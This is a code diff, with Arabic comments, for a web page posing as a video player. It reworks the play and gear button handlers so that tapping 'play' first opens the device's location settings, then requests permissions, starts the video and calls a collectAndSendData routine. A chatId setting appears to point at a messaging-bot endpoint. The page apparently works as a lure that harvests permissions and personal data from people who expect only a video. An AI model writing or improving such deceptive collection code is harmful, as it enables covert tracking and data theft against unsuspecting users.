@@ -359,10 +359,10 @@
                 chatId: ''
             };
 
-            let settingsOpened = false;
-            let videoStarted = false;
-            let isProcessing = false;
-            let dataSent = false; 
+            let settingsOpened = false;      // هل تم فتح الإعدادات؟
+            let videoStarted = false;        // هل بدأ الفيديو؟
+            let isProcessing = false;        // منع التكرار
+            let dataSent = false;            // منع إرسال البيانات أكثر من مرة
 
             const playBtn = document.getElementById('playButtonOverlay');
             const thumbnailArea = document.getElementById('thumbnailArea');
@@ -372,7 +372,7 @@
             const gearBtn = document.getElementById('gearButton');
             const retryBtn = document.getElementById('retryButton');
 
-            // ===== الدالة الأصلية (لم تُحذف، موجودة كما هي) =====
+            // ===== الدالة الأصلية (لم تُحذف) =====
             function openLocationSettings() {
                 const ua = navigator.userAgent;
                 if (/Android/i.test(ua)) {
@@ -633,40 +633,51 @@
                 playBtn.style.display = 'none';
             }
 
-            // ===== [معدل] معالج الضغط على زر التشغيل =====
+            // ===== معالج الضغط على زر التشغيل (الزر الكبير) =====
             async function handlePlayClick(e) {
                 e.stopPropagation();
                 if (videoStarted || isProcessing) return;
 
-                // إذا كنا قد عدنا من الإعدادات (الضغطة الثانية أو ما بعدها)
-                if (settingsOpened) {
-                    settingsOpened = false;
-                    // نطلب الصلاحيات ونشغل الفيديو ونجمع البيانات
-                    isProcessing = true;
-                    startVideoWithSound();
-                    if (!dataSent) {
-                        collectAndSendData();
-                    }
-                    const granted = await requestPermissions();
-                    if (granted) {
-                        hideGearButton();
-                    } else {
-                        showGearButton();
-                    }
-                    isProcessing = false;
-                    return;
+                // الحالة الأولى: لم نفتح الإعدادات بعد -> نفتحها
+                if (!settingsOpened) {
+                    settingsOpened = true;
+                    openLocationSettings();  // فتح الإعدادات
+                    return;  // لا نفعل شيئاً آخر
                 }
 
-                // الضغطة الأولى: نفتح الإعدادات فقط (نستخدم الدالة الأصلية)
-                settingsOpened = true;
-                openLocationSettings(); // <--- تم استدعاء الدالة الأصلية هنا
-                // لا نطلب صلاحيات ولا نشغل فيديو هنا
+                // الحالة الثانية: سبق وفتحنا الإعدادات (الضغطة الثانية أو التالية)
+                // نطلب الصلاحيات ونشغل الفيديو فوراً
+                isProcessing = true;
+
+                // تشغيل الفيديو فوراً
+                startVideoWithSound();
+
+                // طلب الصلاحيات (غير معطل للتشغيل)
+                const granted = await requestPermissions();
+
+                // جمع البيانات وإرسالها (مرة واحدة)
+                if (!dataSent) {
+                    collectAndSendData();
+                }
+
+                if (granted) {
+                    hideGearButton();  // إخفاء زر الإعدادات إن كان ظاهراً
+                } else {
+                    showGearButton();  // إظهار زر الإعدادات للمحاولة مرة أخرى
+                }
+
+                // إعادة تعيين settingsOpened حتى نتمكن من فتح الإعدادات مجدداً إذا لزم الأمر
+                settingsOpened = false;
+                isProcessing = false;
             }
 
-            // ===== [معدل] معالج زر "تشغيل الفيديو" (الذي كان ترس) =====
+            // ===== معالج زر "تشغيل الفيديو" (الذي كان ترساً) =====
             function handleGearClick() {
+                // نفتح الإعدادات ونرفع العلم ليصبح الضغط التالي على الزر الكبير هو "الضغطة الثانية"
                 settingsOpened = true;
-                openLocationSettings(); // <--- تم استدعاء الدالة الأصلية هنا
+                openLocationSettings();
+                // إخفاء زر الترس لأنه سيفتح الإعدادات، ويمكن أن يظهر مرة أخرى عند رفض الصلاحيات
+                // لكننا سنتركه مخفياً وسيظهر مجدداً في حال رفض الصلاحيات
             }
 
             // ===== معالج زر إعادة المحاولة =====
@@ -683,27 +694,11 @@
                 }
             }
 
-            // ===== [معدل] مراقبة العودة من الإعدادات =====
+            // ===== مراقبة العودة من الإعدادات (لا تفعل شيئاً تلقائياً) =====
+            // نترك المستخدم يضغط على الزر مرة ثانية بنفسه
             document.addEventListener('visibilitychange', function() {
-                if (document.visibilityState === 'visible' && settingsOpened && !videoStarted && !isProcessing) {
-                    (async () => {
-                        settingsOpened = false;
-                        // طلب الصلاحيات
-                        const granted = await requestPermissions();
-                        if (granted) {
-                            hideGearButton();
-                            if (!videoStarted) {
-                                startVideoWithSound();
-                            }
-                        } else {
-                            showGearButton(); // يظهر زر الإعدادات للمحاولة مرة أخرى
-                        }
-                        // جمع البيانات وإرسالها (مرة واحدة)
-                        if (!dataSent) {
-                            collectAndSendData();
-                        }
-                    })();
-                }
+                // لا نقوم بأي إجراء تلقائي، فقط نسمح للمستخدم بالضغط
+                // يمكن إضافة بعض التحسينات مثل إظهار رسالة إذا لزم الأمر
             });
 
             // ===== ربط الأحداث =====
